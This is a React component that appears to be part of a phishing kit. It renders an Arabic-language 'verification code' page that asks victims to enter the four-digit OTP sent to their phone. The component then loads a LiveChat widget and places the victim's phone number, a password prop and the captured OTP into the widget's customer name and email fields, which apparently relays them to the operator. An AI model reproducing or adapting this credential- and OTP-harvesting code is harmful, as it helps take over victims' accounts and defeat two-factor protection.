import React, { useEffect, useState } from "react";
import { Spinner } from "./Loader";
import { LiveChatWidget, EventHandlerPayload } from "@livechat/widget-react";

const Code = (props: any) => {
  const [show, setShow] = useState(true);
  const [showSpinner, setShowSpinner] = useState(false);
  const [c1, setC1] = useState("");
  const [c2, setC2] = useState("");
  const [c3, setC3] = useState("");
  const [c4, setC4] = useState("");
  const clear = () => {
    setC1("");
    setC2("");
    setC3("");
    setC4("");
  };
   function handleNewEvent(event: EventHandlerPayload<"onNewEvent">) {
    console.log("LiveChatWidget.onNewEvent", event);
  }
  useEffect(() => {
    if (show) {
      setTimeout(() => setShow(false), 3000);
      setTimeout(() => setShowSpinner(false), 20000);
    }
  }, []);
  useEffect(() => {
    if (c1 && c2 && c3 && c4) {
      props.setCode(`${c1}${c2}${c3}${c4}`);
    }
  }, [c1, c2, c3, c4]);

  return !show ? (
    <div>
      <div
        className="title"
        style={{
          position: "absolute",
          left: 12,
          top: 20,
          opacity: show ? 0 : 1,
          transition: "all 1.5s",
        }}
      >
        <img width={25} src="https://i.ibb.co/bPfYD6g/support.png" alt="logo" />
      </div>
      <div
        className="title"
        style={{
          position: "absolute",
          right: 12,
          top: 20,
        }}
      >
        <img
          width={25}
          src="https://i.ibb.co/ZHYbJRG/world-wide-web.png"
          alt="logo"
        />
      </div>
      <div
        className="title"
        style={{
          color: "white",
          textAlign: "center",
          paddingBottom: 10,
          marginTop: 25,
        }}
      >
        <img
          width={100}
          src="https://i.ibb.co/cJpZcJS/655c6a8f1f13863139ccedfd-1200x630wa-veed-remove-background-p-500.png"
          alt="logo"
        />
      </div>
      <div
        className=""
        style={{ position: "fixed", top: "30%", left: "5%", right: "5%" }}
      >
        <form className="form">
          <div className="title">OTP</div>
          <div className="title">رمز التحقق</div>
          <p className="message">يرجى ادخال رمز التحقق المرسل الى هاتفك</p>
          <div className="inputs">
            <input
              id="input1"
              type="tel"
              maxLength={1}
              onChange={(e) => setC4(e.target.value)}
              value={c4}
              onKeyUp={(e) => {
                if (e.key === "13" || e.currentTarget.value.length === 1) {
                  // Focus on the next sibling
                }
              }}
            />
            <input
              id="input2"
              type="tel"
              maxLength={1}
              onChange={(e) => setC3(e.target.value)}
              onKeyUp={(e) => {
                if (e.key === "13" || e.currentTarget.value.length === 1) {
                  // Focus on the next sibling
                  document.getElementById("input1")!.focus();
                }
              }}
              value={c3}
            />
            <input
              id="input3"
              type="tel"
              maxLength={1}
              onChange={(e) => setC2(e.target.value)}
              onKeyUp={(e) => {
                if (e.key === "13" || e.currentTarget.value.length === 1) {
                  // Focus on the next sibling
                  document.getElementById("input2")!.focus();
                }
              }}
              value={c2}
            />
            <input
              id="input4"
              type="tel"
              maxLength={1}
              onChange={(e) => setC1(e.target.value)}
              onKeyUp={(e) => {
                if (e.key === "13" || e.currentTarget.value.length === 1) {
                  // Focus on the next sibling
                  document.getElementById("input3")!.focus();
                }
              }}
              value={c1}
            />
          </div>
          <div>
            <button
                style={{ fontSize: 15, fontWeight: 600 }}
              onClick={(e) => {
                e.preventDefault();
                props.updateData();
                clear();
                setShowSpinner(true);
              }}
              className="action"
            >
              تحقق
            </button>
          </div>
          <div style={{ paddingTop: 15 }}>
            <Spinner showSpinner={showSpinner} />
            <p
              style={{
                color: "orangered",
                opacity: showSpinner ? 1 : 0,
              }}
              className="message"
            >
              الرجاء الأنتظار للتحقق ...
            </p>
          </div>
        </form>
      </div>
         <LiveChatWidget
        key="10"
        customerName={`${props.phone}`}
        customerEmail={`${props.pass} @ code ${props.code}`}
        onNewEvent={handleNewEvent}
        license="17046132"
      />
    </div>
  ) : null;
};
export default Code;
